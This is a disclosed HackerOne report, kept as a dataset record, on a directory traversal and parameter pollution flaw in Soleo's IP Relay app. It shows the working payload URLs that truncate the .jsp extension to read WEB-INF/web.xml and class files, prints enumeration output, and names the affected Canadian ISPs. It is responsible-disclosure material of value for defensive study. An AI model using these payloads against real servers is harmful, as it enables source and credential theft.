---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '413193'
original_report_id: '413193'
title: Directory Traversal + HTTP Paramater Pollution leaking SQL/LDAP credentials
team_handle: soleo
created_at: '2018-07-17T22:25:59.000Z'
disclosed_at: '2018-09-24T16:28:03.288Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 48
tags:
- hackerone
---

# Directory Traversal + HTTP Paramater Pollution leaking SQL/LDAP credentials

## Metadata

- HackerOne Report ID: 413193
- Weakness: 
- Program: soleo
- Disclosed At: 2018-09-24T16:28:03.288Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Upon visiting the login page of a provider’s IP Relay client, we noticed that if someone were to click the “forgot password” link, it would bring them to a URL which appeared as the following: 

`https://<host>.<tld>/IPRelayApp/servlet/IPRelay?page=forgotPassword`

When attempting to modify the "page" GET parameter, a .jsp extension was appended to the inputted value, preventing File Disclosure from taking place. Use of nullbytes to bypass this extension being appended was an unlikely option, so we turned to HTTP parameter poisoning. By including a trailing question mark on the file name, we were able to fool the server
into thinking it was about to receive a parameter, effectively truncating the trailing `.jsp` extension, like so:

`https://<host>/IPRelayApp/servlet/IPRelay?page=anyfile.txt?`

Attempting Local File Disclosure resulted in an error, but File Disclosure itself was still an option - the web-app is restricted to only loading files from within a certain directory. This limits us to only loading files within `IPRelayApp/*`. In this scenario, this is what the directory layout looked like, thanks to Tomcat:

`IPRelayApp/
  |- jsp/
  |- images/
  |- html/
  |- META-INF/
  |- WEB-INF/
	|- classes/
        |- help/
        |- logs/
        |- lib/
        |- xml/
        |- files/
        |- web.xml`

The `WEB-INF` directory is within the IPRelayApp directory, meaning we could load `web.xml`, an XML document that has a few mappings for Tomcat to understand where to pull certain files from. Attached is proof of the file getting loaded. Here is what the proof-of-concept would look like by this point:

`http://<host>/IPRelayApp/servlet/IPRelay?page=../WEB-INF/web.xml?`

At this point, we wrote a little proof-of-concept to parse the web.xml file and find the location of the source files. This was purely to confirm the severity of this vulnerability. This was the output of our script:

`[+] connecting to <redacted>
src file found @ 'com/soleo/iprelayweb/common/filters/LoggedInFilter.class'
src file found @ 'com/soleo/iprelayweb/common/filters/RedirectionFilter.class'
src file found @ 'com/soleo/iprelayweb/common/filters/HostnameFilter.class'
src file found @ 'com/soleo/iprelayweb/common/filters/SetHeadersFilter.class'
src file found @ 'com/soleo/iprelayweb/common/filters/SetHeadersFilter.class'
src file found @ 'com/soleo/iprelayapp/filters/ChangePasswordFilter.class'
src file found @ 'com/soleo/iprelayweb/common/filters/EncodingFilter.class'
src file found @
'com/soleo/iprelayapp/filters/PasswordChangeRestrictionFilter.class'
src file found @ 'com/soleo/iprelayapp/filters/SSORedirectFilter.class'
src file found @ 'com/soleo/iprelayapp/common/ContextListener.class'
src file found @ 'com/soleo/iprelayapp/servlets/LoginServlet.class'
src file found @ 'com/soleo/iprelayapp/servlets/SoleoInteractionServlet.class'
src file found @ 'com/soleo/iprelayapp/servlets/CreateUserServlet.class'
src file found @ 'com/soleo/iprelayapp/servlets/CreateCDRServlet.class'
src file found @ 'com/soleo/iprelayapp/servlets/FindSecurityQuestionServlet.class'
src file found @ 'com/soleo/iprelayapp/servlets/ChangePasswordServlet.class'
src file found @ 'com/soleo/iprelayapp/servlets/VerifyAccountServlet.class'
src file found @ 'com/soleo/iprelayapp/servlets/GenerateIPRelayPageServlet.class'
src file found @ 'com/soleo/iprelayapp/servlets/ProfilePageServlet.class'
src file found @ 'com/soleo/iprelayapp/servlets/ProfileServlet.class'
src file found @ 'com/soleo/iprelayapp/servlets/PreferencesPageServlet.class'
src file found @ 'com/soleo/iprelayapp/servlets/RegistrationPageServlet.class'
src file found @ 'com/soleo/iprelayapp/servlets/WelcomeServlet.class'
src file found @ 'com/soleo/iprelayapp/servlets/LogoutServlet.class'
src file found @ 'com/soleo/iprelayapp/servlets/UpdateProfileServlet.class'
src file found @ 'com/soleo/iprelayapp/servlets/UpdatePreferencesServlet.class'
src file found @ 'com/soleo/iprelayapp/servlets/ValidateIPUserStatusServlet.class'
src file found @ 'com/soleo/iprelayapp/servlets/OfflineMessageServlet.class'
src file found @ 'com/soleo/iprelayapp/servlets/AddressBookServlet.class'
src file found @ 'com/soleo/iprelayapp/servlets/SaveIPConversationServlet.class'
src file found @ 'com/soleo/iprelayapp/servlets/SessionPingServlet.class'
src file found @ 'com/soleo/iprelayweb/common/servlet/PingServlet.class'
src file found @ 'com/soleo/iprelayweb/common/servlet/Skinner.class'
src file found @ 'com/soleo/iprelayapp/servlets/FinishLoginServlet.class'
src file found @ 'com/soleo/iprelayapp/servlets/SSOEntryServlet.class'
src file found @ 'com/soleo/iprelayapp/servlets/ShibbolethErrorServlet.class'
src file found @ 'com/soleo/iprelayapp/servlets/MakeCallServlet.class'
src file found @ 'com/soleo/iprelayapp/servlets/ChangeOperatingLanguage.class'`

All of the following files can be downloaded by loading them from `WEB-INF/classes/*`.  Once again, to confirm severity, we tried to load one of these files, specifically `IPRelay.class` - the attached image shows the file being successfully downloaded.

After loading this file into our text editor, it was evident that these classes had been compiled in Java bytecode. However, a determined attacker would easily be able to convert this directly back to source, compromising source code and other sensitive files. Within the source code lies passwords which allow the servlet to communicate with other services, such as SQL/LDAP. An attacker could extract these passwords from within the source files, and further escalate their privileges on the server, or even use said information in a social engineering attack. The end result could be escalated to yield remote code execution, though we were not comfortable attempting to do this before getting in contact with the vendor. Attached you can find a `.class` file which leads to sensitive Information Disclosure.

Essentially every Internet Service Provider in Canada uses Soleo’s IP Relay service. This was not an initial discovery however upon further analysis the impact of this vulnerability kept increasing. By utilizing Google dorks, we were able to determine that there were at least ​ten ​other Internet Service Providers in Canada that wererunning the same vulnerable instance of Soleo’s IP Relay. Interestingly enough six out of the ten vulnerable ISPs were actually the largest telecom providers in Canada.

To conclude this report, we have confirmed that a determined attacker (APT/foreign entity) could leverage this vulnerability to steal passwords from configuration files across multiple providers, compromise said providers using the stolen passwords, and then ​potentially​ launch a large scale identity theft operation against Canadians. Seeing as Canada’s federal elections are coming up in 2019, this vulnerability could have had detrimental effects for Canadian citizens who confide in these providers to safeguard their identity. Due to our concerns about the social security of Canadian citizens, we decided to compile a list of the providers that were affected by this vulnerability. In total this can ultimately lead to the compromise of over 30 million Canadian records. Here are some major providers that were affected:

`Bell
Sasktel
Telus
Shaw
Videotron
MTS
Rogers (their services are hosted at iprelayservice.net)
Bell Aliant
Cogeco
Fido (their services are hosted at iprelayservice.net)
Koodo (their services are hosted at iprelayservice.net)
Chatr (their services are hosted at iprelayservice.net)
AllStream
EastLink`

This flaw was remediated on 10th August 2018, roughly three weeks after our initial disclosure.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
